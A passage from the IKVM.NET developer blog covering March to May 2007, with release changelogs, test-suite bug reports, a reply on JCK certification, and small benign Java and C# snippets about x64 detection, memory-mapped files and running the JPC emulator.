		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=84dac970-f23c-4fb4-8186-2556f721981a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=84dac970-f23c-4fb4-8186-2556f721981a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 02 May 2007</h2></div>
<div class="newsItems"><a name="a16662149-a220-46de-9ef8-91d9fdeea099"></a><div class="entry">
	<h3 class="entryTitle">More Good Tests</h3>
	<div class="entryBody">
		<P>Albert Strasheim mailed me the suggestion to run the <A href="http://jakarta.apache.org/commons/lang/">Apache Commons Lang</A> test suite (BTW, Albert was also the one who pointed me to the <A HREF="/CommentView.aspx?guid=d33a3f51-c6fc-4aaa-b3ce-64b742017c40">JRuby and MTJ test suites</A>).</P>
<P>That also resulted in a number of bugs fixed/filed:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR bgColor=#f0f0f0>
<TD><A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang.exception/NestableErrorTestCase/testPrintStackTrace/">NestableErrorTestCase.testPrintStackTrace failure</A>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD><A href="http://sourceforge.net/mailarchive/forum.php?thread_name=E1HioVE-0005lq-7v@mail.sourceforge.net&amp;forum_name=ikvm-commit">Various IKVM java.lang.Throwable fixes</A></TD></TR>
<TR>
<TD><A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang/CharSetTest/testSerialization/">CharSetTest.testSerialization failure</A></TD>
<TD><A href="http://bugzilla.ximian.com/show_bug.cgi?id=81501">Mono reflection bug</A></TD></TR>
<TR bgColor=#f0f0f0>
<TD><A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang/NumberUtilsTest/testCompareDouble/">NumberUtilsTest.testCompareDouble failure</A></TD>
<TD>Added hack to IKVM's <A href="http://sourceforge.net/mailarchive/forum.php?thread_name=E1HioQj-0004cr-Vu@mail.sourceforge.net&amp;forum_name=ikvm-commit">Double.toString()</A> and <A href="http://sourceforge.net/mailarchive/forum.php?thread_name=E1HioQj-0004cx-WE@mail.sourceforge.net&amp;forum_name=ikvm-commit">Double.parseDouble()</A> to support Double.MIN_VALUE and Double.MAX_VALUE</TD></TR>
<TR>
<TD><A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang/NumberUtilsTest/testIsNumber/">NumberUtilsTest.testIsNumber failure</A></TD>
<TD><A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=31770">GNU Classpath BigDecimal bug</A></TD></TR>
<TR bgColor=#f0f0f0>
<TD><A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang.time/DateUtilsTest/testAddYears/">DateUtilsTest.testAddYears failure</A></TD>
<TD><A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=31784">GNU Classpath GregorianCalendar bug</A></TD></TR></TBODY></TABLE>
<P>This list doesn't explain <A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/">all failures</A>, some are caused by the same issues as the ones mentioned and I think there are a few more GNU Classpath calendar/date/time etc. related bugs and a few tests are not quite "correct". For example, the <A href="http://javatests.bekstil.net/hudson/job/commons-lang--commons-lang--2.3--IKVM/lastSuccessfulBuild/testReport/org.apache.commons.lang.builder/ToStringBuilderTest/testReflectionHierarchyArrayList/">ToStringBuilderTest.testReflectionHierarchyArrayList</A> test assumes that the private member that contains the array of java.util.ArrayList is named elementData, but in GNU Classpath's implementation it is named data.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/02/2007 08:32:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=16662149-a220-46de-9ef8-91d9fdeea099"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=16662149-a220-46de-9ef8-91d9fdeea099">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a72a61566-fb40-4f1b-b4b2-00359d0e0b0b"></a><div class="entry">
	<h3 class="entryTitle">Groovy</h3>
	<div class="entryBody">
		<P><A href="http://docs.codehaus.org/display/GROOVY/Running+Groovy+on+.NET+2.0+using+IKVM">Running Groovy on IKVM</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/02/2007 06:47:19 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=72a61566-fb40-4f1b-b4b2-00359d0e0b0b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=72a61566-fb40-4f1b-b4b2-00359d0e0b0b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 29 April 2007</h2></div>
<div class="newsItems"><a name="a997976fa-b350-488c-ada9-900aab867489"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 rc3</h3>
	<div class="entryBody">
		<P>While working on NIO pipe support in the development branch, I found a few socket bugs and I decided to back port them to the 0.34 release. I've also back ported the NIO pipe support itself, since that's a low risk change.</P>
<P>Changes since rc2:</P>
<UL>
<LI>Implemented NIO pipe support.</LI>
<LI>Added support for socket connect with timeout.</LI>
<LI>Fixed Socket.bind() to set local port after binding.</LI>
<LI>Fixed SocketChannel.read() to return -1 if other side closed the socket.</LI>
<LI>Fixed ServerSocketChannel.accept() to properly set the state in the returned socket, to fix the socket from breaking if you called certain Socket methods on the SocketChannel.socket(). This was a regression introduced during the 0.33 development.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.34.0.2.zip"><STRONG>ikvm-0.34.0.2.zip</STRONG></A> (source + binaries) and <A href="http://www.frijters.net/ikvmbin-0.34.0.2.zip"><STRONG>ikvmbin-0.34.0.2.zip</STRONG></A> (binaries).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/29/2007 11:01:44 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=997976fa-b350-488c-ada9-900aab867489"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=997976fa-b350-488c-ada9-900aab867489">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 25 April 2007</h2></div>
<div class="newsItems"><a name="a900ca891-745c-4e34-9bc3-8c07bcdc11eb"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 rc2</h3>
	<div class="entryBody">
		<P>A new release candidate that fixes a regression in String.lastIndexOf(String,int) that I introduced in rc1.</P>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.34.0.1.zip"><STRONG>ikvm-0.34.0.1.zip</STRONG></A> (source + binaries) and <A href="http://www.frijters.net/ikvmbin-0.34.0.1.zip"><STRONG>ikvmbin-0.34.0.1.zip</STRONG></A> (binaries).</P>
<P>Also a clarification: As of this release there is no longer a separate &#8220;generics&#8221; build, because the 1.5 specific stuff has been merged into the GNU Classpath main release.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/25/2007 05:52:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=900ca891-745c-4e34-9bc3-8c07bcdc11eb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=900ca891-745c-4e34-9bc3-8c07bcdc11eb">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 April 2007</h2></div>
<div class="newsItems"><a name="a0654bf96-65dd-4e94-a1bf-7c7f04070f6e"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 rc1</h3>
	<div class="entryBody">
		<P><A href="http://www.gnu.org/software/classpath/announce/20070423.html">GNU Classpath 0.95</A> has been released! Here's the corresponding IKVM release candidate. I've updated the <A href="http://www.frijters.net/ikvm-japi-status.html">Japi status page</A>.</P>
<P>Changes since previous snapshot:</P>
<UL>
<LI>Integrated GNU Classpath 0.95 release.</LI>
<LI>Fixed ByteBuffer.allocateDirect() to zero initialize the memory it allocated.</LI>
<LI>Fixed various String methods (indexOf, lastIndexOf, startsWith, endsWith, contains, replace) to use ordinal semantics instead of culture dependent word matching. Thanks to Louis Boydstun for tracking this bug down.</LI>
<LI>Fixed potential deadlock when a dying thread is interrupted.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.34.0.0.zip">ikvm-0.34.0.0.zip</A> (source + binaries) and <A href="http://www.frijters.net/ikvmbin-0.34.0.0.zip">ikvmbin-0.34.0.0.zip</A> (binaries).</P>
<P>As usual these are the strong named binaries and if no major issues are found these files will be released and placed on the SourceForge download page.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/23/2007 17:14:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0654bf96-65dd-4e94-a1bf-7c7f04070f6e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0654bf96-65dd-4e94-a1bf-7c7f04070f6e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a341e5667-93f1-4bf0-8d42-f2f6a924e587"></a><div class="entry">
	<h3 class="entryTitle">JCK Certification</h3>
	<div class="entryBody">
		<P>Dan Diephouse wrote in the comments to the previous entry:</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>Thats some serious comment spam thwarter - I had to look up the answer! Might I suggest Askimet? It rocks.</P></DIV>
<P>Yeah, sorry about that. That was mainly driven by ease of implementation. The fixed question was very easy to add in the aspx page without having to do any thinking on my part. The most amazing part is that a spammer actually managed to get through a couple of weeks ago.</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>Anyway, was wondering, do you think IKVM could ever become a certified java run time? (provided Sun made the JCK available under a reasonable license)</P></DIV>
<P>Funny you should ask, because I was thinking about blogging about this question yesterday (inspired by the <A href="http://blogs.codehaus.org/people/geir/archives/001560_apaches_open_letter_to_sun.html">Apache open letter</A> and <A href="http://gnu.wildebeest.org/diary/2007/04/21/openjck/">Mark Wielaard</A>'s and <A href="http://article.gmane.org/gmane.comp.java.classpath.devel/9160">Dalibor Topic</A>'s responses).</P>
<P>The short answer is that it's not my goal for IKVM to be a certified Java runtime. I do not have access to the JCK, but it is my understanding that adding extra functionality is not allowed. Since IKVM runs on .NET it makes sense to expose .NET functionality (like for example delegates and P/Invoke). Remember that when Microsoft added delegates and J/Direct (which is the predecessor to P/Invoke) to its JVM they got sued by Sun for violating their license agreement.</P>
<P>There are also other issues that make a fully compliant version of IKVM only of theoretical interest. The floating point performance would be pretty bad, for example. Currently, the floating point support uses the native .NET floating point operations, but those are too relaxed for the JVM specification (mostly because they use too much precision). Another example: If you wanted static initializers to work according to the JVM spec (i.e. deadlock in certain scenarios), that would make them less efficient and would hinder interop with .NET code. One more: Because <CODE>CharSequence</CODE> is a ghost interface, when you do <CODE>new CharSequence[]</CODE> you really get an <CODE>Object[]</CODE>, again it's possible to hide this from Java code, but it would make all object array access very slow.</P>
<P>Finally, there is one thing that I really don't know how to implement (in the current architecture). In Java it is possible for JNI code to allocate a string object and then later on call the constructor on it (or even to call the constructor twice), because .NET strings are variable size objects and require that the contents be specified at allocation time this is impossible to implement on IKVM.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/23/2007 08:54:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=341e5667-93f1-4bf0-8d42-f2f6a924e587"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=341e5667-93f1-4bf0-8d42-f2f6a924e587">Comments [4]</a>
		
		<br clear="all">
	</div>
</div><a name="ad33a3f51-c6fc-4aaa-b3ce-64b742017c40"></a><div class="entry">
	<h3 class="entryTitle">Running Application Test Suites</h3>
	<div class="entryBody">
		<P>Last week an anonymous person filed three bugs (<A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1701353&amp;group_id=69637&amp;atid=525264">1701353</A>, <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1701738&amp;group_id=69637&amp;atid=525264">1701738</A> and <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1701756&amp;group_id=69637&amp;atid=525264">1701756</A>). The first one was a URI bug that was already fixed in GNU Classpath, but the other two were more interesting because they included references to Eclipse projects that include JUnit test suites that reported some failures.</P>
<P>Now this is not always the case, but running the test suites for these two projects was a joy and resulted in several bugs filed/fixed:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR bgColor=#f0f0f0>
<TD>Random MTJ test failures</TD>
<TD><A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=31646">GNU Classpath java.util.Arrays.sort() bug</A></TD></TR>
<TR>
<TD>JRuby test_bignum failure</TD>
<TD><A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=31646">GNU Classpath java.math.BigInteger.mod() bug</A></TD></TR>
<TR bgColor=#f0f0f0>
<TD>JRuby test_zlib failure</TD>
<TD><A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=31649">GNU Classpath java.util.zip.GZIPInputStream constructor bug</A></TD></TR>
<TR>
<TD>Random JRuby test_thread_group hang&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD><A href="http://sourceforge.net/mailarchive/forum.php?thread_name=E1HfYLq-0001tE-AZ@mail.sourceforge.net&amp;forum_name=ikvm-commit">IKVM.NET thread termination deadlock bug</A></TD></TR></TBODY></TABLE>
<P><BR>The reason that the MTJ tests failed in a random way was because the tests are non-deterministic. They generate random sized matrices, so the sort bug wouldn't always result in an incorrect sorting of the array indices.</P>
<P>Unfortunately I had to close <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1701738&amp;group_id=69637&amp;atid=525264">1701738</A> as Wont Fix. The JRuby test_array test intentionally causes a stack overflow and then JRuby expects to recover from that by catch StackOverflowError, but it's not possible for IKVM to reliably support catching a System.StackOverflowException and then mapping it to java.lang.StackOverflowError. The mapping exists, but if the exception is caught while there is not enough stack space for the mapping code to run, the CLR terminates the application.</P>
<P>The are two more JRuby tests that fail: test_io and test_pipe. These tests fail due to the fact that I haven't yet implemented NIO pipes. This is the first time ever that I've seen code "use" NIO pipes, but since it's only a test case I'm still not very motivated to implement them (but patches are welcome, as are applications that use NIO pipes).</P>
<P>If anyone has any other suggestions for test suites (that are easy to run like these), I'd love to hear them.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/23/2007 07:42:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d33a3f51-c6fc-4aaa-b3ce-64b742017c40"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d33a3f51-c6fc-4aaa-b3ce-64b742017c40">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 11 April 2007</h2></div>
<div class="newsItems"><a name="a98635f7e-fdfa-43ab-8a80-e7b28e2cdebf"></a><div class="entry">
	<h3 class="entryTitle">Detecting .NET 2.0 x64</h3>
	<div class="entryBody">
		<P>In the category .NET trivia. I found a weird difference between .NET 2.0 x86 and x64. This code detects that it runs on x64 (at least the .NET 2.0 build included with Vista x64):</P>
<P><CODE><FONT color=#2b91af>WeakReference</FONT> r = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>WeakReference</FONT>(<FONT color=#0000ff>null</FONT>);<BR><FONT color=#0000ff>try</FONT> { <FONT color=#0000ff>throw new</FONT> <FONT color=#2b91af>Exception</FONT>(); }<BR><FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>Exception</FONT> x) { r.Target = x; }<BR><FONT color=#2b91af>GC</FONT>.Collect();<BR><FONT color=#0000ff>if</FONT> (r.Target != <FONT color=#0000ff>null</FONT>)<BR>&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(<FONT color=#7d3302>"Running on x64"</FONT>);</CODE></P>
<P>It appears that the last thrown exception is stored in a global (or rather probably thread local) variable and hence&nbsp;not garbage collectable until the next exception is thrown...</P>
<P><STRONG>Update:&nbsp;</STRONG>I thought this was obvious, but since two commenters have felt the need to point out that you shouldn't use this in production, I'll say it explicitly:I was just pointing out some obscure implementation difference&nbsp;(arguably a bug), do not use this code in production.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/11/2007 15:31:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=98635f7e-fdfa-43ab-8a80-e7b28e2cdebf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=98635f7e-fdfa-43ab-8a80-e7b28e2cdebf">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 09 April 2007</h2></div>
<div class="newsItems"><a name="a1f34c953-157e-4b42-be53-98f6b31f143b"></a><div class="entry">
	<h3 class="entryTitle">Memory Mapped Files</h3>
	<div class="entryBody">
		<P>What happens when you get a read error while accessing a memory mapped file? Let's try it:</P>
<P><CODE>RandomAccessFile raf = new RandomAccessFile("\\\\server\\share\\filename", "r");<BR>FileChannel channel = raf.getChannel();<BR>MappedByteBuffer map = channel.map(FileChannel.MapMode.READ_ONLY, 0, 5 * 1024 * 1024);<BR>map.get(10 * 1024);<BR>System.out.println("read byte at 10K -- waiting");<BR>Thread.sleep(5000);<BR>map.get(500 * 1024);<BR>System.out.println("read byte at 500K");</CODE></P>
<P>Running this on JDK 1.6 (x64) and removing the network cable during the sleep will result in an Internal Error in the VM. Not exactly what I had hoped for.</P>
<P>Interestingly, on IKVM doing the same results in a <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.runtime.interopservices.sehexception.aspx">cli.System.Runtime.InteropServices.SEHException</A></CODE> being thrown.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/09/2007 11:32:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1f34c953-157e-4b42-be53-98f6b31f143b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1f34c953-157e-4b42-be53-98f6b31f143b">Comments [1]</a>
		
		<br clear="all">
	</div>
</div><a name="acb5cd79d-27af-49a8-a118-44ea96fdfce3"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>The GNU Classpath 0.95 release branch has been created (0.94 was skipped), so it shouldn't be long now before I will release IKVM 0.34, but before that here's a final snapshot containing everything that will be in 0.34.</P>
<P>Changes:</P>
<UL>
<LI>Integrated current GNU Classpath cvs version.</LI>
<LI>.NET "generic class loaders" now return something (mildly) sensible when toString() is called on them.</LI>
<LI>ikvmc no longer warns about generic stubs.</LI>
<LI>ikvmstub now has WHIDBEY conditional code to properly determine if a class is a generic type instance (instead of the name based hack).</LI>
<LI>Fixed .NET generic type name mangling bug (nested generic types were double encoded).</LI>
<LI>Added support for loading .NET generic type stubs.</LI>
<LI>Fixed several .NET generic type loading bugs.</LI>
<LI>Fixed ikvm.runtime.Util.getInstanceTypeFromClass() to return null instead of throw an exception when it is called on a "dynamic only" class.</LI>
<LI>Changed ikvmstub to use java.util.zip instead of SharpZipLib.</LI>
<LI>Fixed index/length overflow detection in arraycopy_primitive_n methods.</LI>
<LI>Fixed JNI init args and thread attach string conversions.</LI>
<LI>Added workaround for .NET bug that caused OverflowException when compiling a class with an initialized final instance field of type char with a value &gt; 32K.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.33.2655.zip">ikvmbin-0.33.2655.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/09/2007 10:19:22 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cb5cd79d-27af-49a8-a118-44ea96fdfce3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cb5cd79d-27af-49a8-a118-44ea96fdfce3">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 26 March 2007</h2></div>
<div class="newsItems"><a name="a5be1f54c-83d5-45b9-b24f-71d81382ffea"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>The GNU Classpath 0.94 release is due soon (hopefully), but in the mean time here's a new snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Integrated current GNU Classpath cvs version.</LI>
<LI>Fixed VMStackWalker.firstNonNullClassLoader() to handle reflection scenarios (this fixes a problem with serialization where the wrong class loader would be used when deserializing a class that has a custom readObject method.)</LI>
<LI>Added VMFile.setReadable/setWritable/setExecutable/canExecute. Although only setWritable does anything halfway usable (all these methods behave like the JDK on Windows, so only the file's ReadOnly attribute is manipulated).</LI>
<LI>Changed the build process to build IKVM.Runtime.dll in two passes, the first pass is used to compile IKVM.GNU.Classpath.dll against and then in the second pass IKVM.Runtime.dll can statically reference IKVM.GNU.Classpath.dll. This removes the need to use reflection to find IKVM.GNU.Classpath.dll at runtime and thus allows multiple versions of IKVM to co-exist side by side in the same AppDomain now.</LI>
<LI>Added support for stubbing abstract methods that contain unsupported argument types (ByRef and Pointer)</LI>
<LI>Regenerated mscorlib.jar and System.jar</LI>
<LI>Changed RetentionPolicy on .NET custom attribute annotations to RUNTIME, so that ikvmc sees them (fixes a regression).</LI>
<LI>Handled signature clashes in .NET type methods.</LI>
<LI>Made method parameter name handling robust against invalid or incomplete local variables tables.</LI>
<LI>Fixed interface implementation to recurse all the way up.</LI>
<LI>Fixed bytecode metadata table to mark div/rem bytecodes as possibly throwing an exception (this fixes bug 1676377, thanks to Dennis Ushakov for reporting this)</LI>
<LI>Made WinForms/AWT thread into a Background thread, to prevent it from keeping the process alive.</LI>
<LI>Added -time option to ikvmc.</LI>
<LI>Added x64 detection to jvm.dll build script.</LI>
<LI>Fixed several .NET 2.0 "ReflectionOnly" bugs.</LI>
<LI>Implemented java.awt.Desktop peer.</LI>
<LI>Fixed several issues pointed out by FxCop: FileChannelImpl now calls GetLastWin32Error() immediately after the P/Invoke. Runtime.addShutdownHook() now has a LinkDemand for ControlAppDomain (because it exposes the AppDomain.ProcessExit event, which also has this LinkDemand). Ghost types now have an Equals, GetHashCode, == and != method. Comparable.__Helper now has a private constructor and is sealed. Shadow methods in remapped types (that exist to hide the base class methods from Intellisense) now copy any LinkDemands from the methods they hide.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.33.2641.zip">ikvmbin-0.33.2641.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/26/2007 15:01:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5be1f54c-83d5-45b9-b24f-71d81382ffea"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5be1f54c-83d5-45b9-b24f-71d81382ffea">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 25 March 2007</h2></div>
<div class="newsItems"><a name="ac4e5ca7a-e907-4889-a281-97a663ab7abf"></a><div class="entry">
	<h3 class="entryTitle">Running DOS Games</h3>
	<div class="entryBody">
		<P>Since I'm running Vista x64, I can't run DOS apps anymore (since the AMD64 arch doesn't support VM86 when running in 64 bit mode). I can, of course, still run DOS inside the VMWare image of my old machine, but now there something much cooler <A href="http://www.physics.ox.ac.uk/jpc/index.html">JPC</A>. An x86 PC emulator written in Java. Naturally, I had to try running it on IKVM:</P>
<P><IMG alt="Lemmings for DOS running on IKVM" src="http://www.frijters.net/jpc_lemmings.png"></P>
<P>The image shows Lemming for DOS running on the JPC x86 emulator running on IKVM.NET running on the x64 CLR.</P>
<P>Unfortunately IKVM's AWT support is not good enough for this app to work, so I had to do some pretty gross app specific hacks to make it "work" (that I obviously won't check in). It's also awfully slow (on JDK 1.6 the game is actually playable, but on IKVM definitely not.)</P>
<P>If any of the other GNU Classpath hackers want to try running JPC. Here's the AppletViewer class I used:</P>
<P><CODE>import java.awt.*;<BR><BR>class AppletViewer<BR>{<BR>&nbsp; public static void main(String[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; Frame f = new Frame();<BR>&nbsp;&nbsp;&nbsp; f.setSize(640, 480);<BR>&nbsp;&nbsp;&nbsp; f.setLayout(new GridLayout(1, 1));<BR>&nbsp;&nbsp;&nbsp; org.jpc.j2se.JPCApplet applet = new org.jpc.j2se.JPCApplet();<BR>&nbsp;&nbsp;&nbsp; f.add(applet);<BR>&nbsp;&nbsp;&nbsp; f.show();<BR>&nbsp;&nbsp;&nbsp; applet.init();<BR>&nbsp;&nbsp;&nbsp; applet.start();<BR>&nbsp; }<BR>}</CODE></P>
<P>The JPC applet jar can be downloaded <A href="http://www.physics.ox.ac.uk/jpc/JPCAppletObfs.jar">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/25/2007 12:41:43 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c4e5ca7a-e907-4889-a281-97a663ab7abf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c4e5ca7a-e907-4889-a281-97a663ab7abf">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 19 March 2007</h2></div>
<div class="newsItems"><a name="aebb699ba-8164-4566-b487-af71ad7ba19c"></a><div class="entry">
	<h3 class="entryTitle">ThinkPad Z61p & Vista x64</h3>
	<div class="entryBody">
